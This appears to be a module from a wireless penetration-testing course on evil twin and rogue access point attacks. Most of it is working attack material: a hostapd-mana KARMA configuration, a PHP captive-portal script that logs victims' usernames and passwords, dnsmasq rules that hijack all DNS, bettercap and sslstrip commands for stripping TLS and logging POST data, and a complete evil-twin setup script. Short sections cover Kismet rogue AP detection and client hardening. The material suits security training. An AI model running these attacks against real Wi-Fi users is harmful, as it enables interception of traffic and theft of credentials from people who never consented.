# Module 03 — Evil Twin & Rogue AP

## 3.1 Evil Twin Architecture

### Attack Components

```
Attacker System:
├── hostapd-mana (Rogue AP)
├── dnsmasq (DNS/DHCP)
├── Responder.py (Hash capture)
└── iptables (Traffic routing)

Victim Flow:
1. Probe for known SSID
2. Connect to Evil Twin (same SSID, stronger signal)
3. DHCP assigned by attacker
4. DNS hijacked to attacker
5. Captive portal or traffic interception
```

---

## 3.2 KARMA Attack

### Mechanism

KARMA (Karma Attack Response): AP responds to ALL probe requests with "Yes, that's me"

```
Normal AP Behavior:
Client: Probe Request for "HomeWiFi"
Legit AP: No response (SSID doesn't match)

KARMA AP Behavior:
Client: Probe Request for "HomeWiFi"
KARMA AP: Probe Response "Yes, I'm HomeWiFi"
Client: Auto-connects (if saved network)
```

### hostapd-mana KARMA Configuration

```bash
# /etc/hostapd-mana/karma.conf
interface=wlan0
ssid=KARMA
channel=6

# KARMA mode - respond to all probes
mana_wpe=1
mana_loud=1

# Enable all karma features
enable_mana=1
```

### Execution

```bash
# Start KARMA AP
sudo hostapd-mana /etc/hostapd-mana/karma.conf

# Monitor connections
tail -f /var/log/syslog | grep hostapd
```

---

## 3.3 Captive Portal Attack

### Portal Components

```
portal/
├── index.html        # Fake login page
├── style.css         # Clone target styling
├── script.js         # Form validation
├── capture.php       # Credential handler
└── redirect.html     # Post-capture redirect
```

### Simple PHP Capture

```php
<?php
// capture.php
$data = date('Y-m-d H:i:s') . " | ";
$data .= $_SERVER['REMOTE_ADDR'] . " | ";
$data .= "User: " . $_POST['username'] . " | ";
$data .= "Pass: " . $_POST['password'] . "\n";

file_put_contents('/var/log/captive-creds.txt', $data, FILE_APPEND);

// Redirect to real site
header('Location: https://real-site.com');
?>
```

### DNS Redirection

```bash
# dnsmasq.conf
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.100,12h

# Redirect all DNS to captive portal
address=/#/10.0.0.1

# Or selective
address=/google.com/10.0.0.1
address=/facebook.com/10.0.0.1
```

---

## 3.4 SSL/TLS Downgrade

### SSLstrip Technique

```bash
# bettercap with SSL stripping
sudo bettercap -iface wlan0

# In bettercap shell:
set http.proxy.sslstrip true
set http.proxy.injectjs alert('SSL stripped')
http.proxy on
```

### HSTS Bypass

```bash
# SSLstrip+ with HSTS bypass
sslstrip -l 8080 -p -k

# -l = listen port
# -p = log POST data
# -k = kill sessions (force re-auth)
```

---

## 3.5 Detection: Rogue AP Signatures

### Kismet Rogue Detection

```bash
# Alert on unexpected BSSIDs
kismet -c wlan0mon --enable-alert rogueap

# Signature triggers:
# - New AP with corporate SSID
# - Signal strength spike
# - Certificate fingerprint mismatch
```

### SSID Confusion (CVE-2023-52424)

**Vulnerability**: 802.11 standard doesn't protect SSID during handshake
**Impact**: Downgrade to different network with same credentials
**Detection**: Monitor for SSID switching during handshake

---

## 3.6 Defense: Rogue AP Mitigation

### 802.11k/v/r Fast Transition

```
802.11k: Neighbor reports - clients know legitimate APs
802.11v: BSS Transition Management - coordinated roaming
802.11r: Fast BSS Transition - reduces roaming time
```

### Client Hardening

```
Disable automatic connection to open networks
Disable WiFi when not in use (airports, hotels)
Verify certificate on enterprise networks
Use VPN for all untrusted networks
```

---

## 3.7 PoC: Full Evil Twin Setup

```bash
#!/bin/bash
# evil-twin.sh

ESSID=$1
CHANNEL=$2

# Setup
mkdir -p /tmp/evil-twin
cd /tmp/evil-twin

# Create hostapd config
cat > hostapd.conf << EOF
interface=wlan0
driver=nl80211
ssid=$ESSID
hw_mode=g
channel=$CHANNEL
mana_wpe=1
EOF

# Start services
sudo hostapd-mana hostapd.conf &
sudo dnsmasq -C dnsmasq.conf &
sudo python3 -m http.server 80 &

echo "[+] Evil Twin running: $ESSID"
echo "[+] Monitor /var/log for credentials"
```

---

**Next**: [Module 04 — PMKID Attack](04-pmkid-attack.md)
